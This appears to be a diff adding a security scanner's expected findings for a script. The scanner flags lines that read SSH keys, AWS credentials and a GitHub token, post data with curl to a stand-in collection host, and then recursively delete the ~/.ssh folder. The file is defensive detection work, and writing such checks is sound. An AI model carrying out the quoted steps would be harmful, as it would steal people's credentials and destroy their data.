@@ -1,0 +1,47 @@
+[danger] reads-credentials
+  Reads credentials
+  line 13:  put file (home & "/.ssh/id_rsa") into private key
+  hint: This path points at a file that usually holds keys or tokens.
+  no repair: the fix is not derivable from the text
+
+[danger] reads-credentials
+  Reads credentials
+  line 14:  put file (home & "/.aws/credentials") into aws keys
+  hint: This path points at a file that usually holds keys or tokens.
+  no repair: the fix is not derivable from the text
+
+[caution] reads-secret-from-environment
+  Reads a secret from the environment (GITHUB_TOKEN)
+  line 15:  put the environment variable "GITHUB_TOKEN" into git token
+  hint: This environment variable normally holds a token or key.
+  no repair: the fix is not derivable from the text
+
+[danger] secrets-read-then-network
+  Secrets read, then the network is contacted
+  line 21:  try to run "curl" with "--silent", "--data", payload, \
+  hint: This script reads credentials and also sends data over the network. On a script you did not write yourself, that is the pattern of data theft.
+  no repair: the fix is not derivable from the text
+
+[caution] timeout-on-curl
+  No timeout on curl
+  line 21:  try to run "curl" with "--silent", "--data", payload, \
+  hint: A network command with no deadline can hang the script indefinitely.
+  no repair: the fix is not derivable from the text
+
+[caution] failure-ignored-curl
+  Failure ignored (curl)
+  line 21:  try to run "curl" with "--silent", "--data", payload, \
+  hint: This was written as 'try to run' but the result is never examined, so a failure passes silently.
+  no repair: the fix is not derivable from the text
+
+[note] reaches-network-via-curl
+  Reaches the network via curl (https://backups-cdn.example.net/collect)
+  line 21:  try to run "curl" with "--silent", "--data", payload, \
+  hint: Data can leave this machine, and the result depends on a system you do not control.
+  no repair: the fix is not derivable from the text
+
+[danger] recursive-forced-delete
+  Recursive forced delete
+  line 25:  run "rm" with "-rf", home & "/.ssh"
+  hint: rm -rf removes a whole tree without confirming and without reporting what it removed.
+  no repair: the fix is not derivable from the text
